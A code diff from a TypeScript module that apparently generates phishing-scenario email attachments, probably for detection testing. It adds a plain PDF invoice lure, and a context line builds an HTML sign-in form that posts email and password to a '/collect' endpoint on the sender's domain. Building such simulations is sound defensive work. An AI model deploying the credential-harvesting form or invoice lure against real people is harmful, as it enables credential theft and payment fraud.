@@ -83,6 +83,42 @@ export function zipStored(entries: { name: string; data: Uint8Array }[]): Uint8A
   return out;
 }
 
+// A one-page PDF invoice (ISO 32000-1: catalog, page tree, page, Helvetica, one text stream, cross-reference table):
+// the supplier, the customer, the invoice number and the amount the body names.
+export function invoicePdf(spec: Spec): Uint8Array {
+  const ascii = (s: string) => s.replace(/[^\x20-\x7e]/g, " ").replace(/([\\()])/g, "\\$1");
+  const lines = [
+    `${spec.claimed}`,
+    "TAX INVOICE",
+    `Invoice: ${spec.details.invoice ?? ""}`,
+    `Bill to: ${spec.recipient}`,
+    `Date: ${dateOf(spec).toISOString().slice(0, 10)}`,
+    `Amount due: ${spec.details.amount ?? ""}`,
+    "Paid to the account on file. Thank you for your business.",
+  ];
+  const text = lines
+    .map((l, i) => `BT /F1 ${i === 0 ? 16 : 11} Tf 72 ${760 - i * 24} Td (${ascii(l)}) Tj ET`)
+    .join("\n");
+  const objects = [
+    "<< /Type /Catalog /Pages 2 0 R >>",
+    "<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
+    "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Resources << /Font << /F1 4 0 R >> >> /Contents 5 0 R >>",
+    "<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
+    `<< /Length ${text.length} >>\nstream\n${text}\nendstream`,
+  ];
+  let out = "%PDF-1.4\n";
+  const offsets: number[] = [];
+  for (const [i, body] of objects.entries()) {
+    offsets.push(out.length);
+    out += `${i + 1} 0 obj\n${body}\nendobj\n`;
+  }
+  const xref = out.length;
+  out += `xref\n0 ${objects.length + 1}\n0000000000 65535 f \n`;
+  for (const o of offsets) out += `${String(o).padStart(10, "0")} 00000 n \n`;
+  out += `trailer\n<< /Size ${objects.length + 1} /Root 1 0 R >>\nstartxref\n${xref}\n%%EOF\n`;
+  return new TextEncoder().encode(out);
+}
+
 // The attachment's bytes, made in code: a Windows executable's header, a macro-enabled Word document (its VBA project
 // part holds no code), an HTML sign-in form, or a one-page PDF.
 export function attachmentBytes(spec: Spec): Uint8Array {
@@ -116,7 +152,7 @@ export function attachmentBytes(spec: Spec): Uint8Array {
     return new TextEncoder().encode(
       `<!doctype html><html><head><title>${spec.claimed}</title></head><body><h1>${spec.claimed}</h1><form action="https://${domainOf(spec.from.address)}/collect" method="post"><label>Email <input name="email"></label><label>Password <input name="password" type="password"></label><button>View statement</button></form></body></html>`,
     );
-  return new TextEncoder().encode("%PDF-1.4\n1 0 obj<</Type/Catalog>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n");
+  return invoicePdf(spec);
 }
 
 // The Authentication-Results Google writes for the scenario's results.
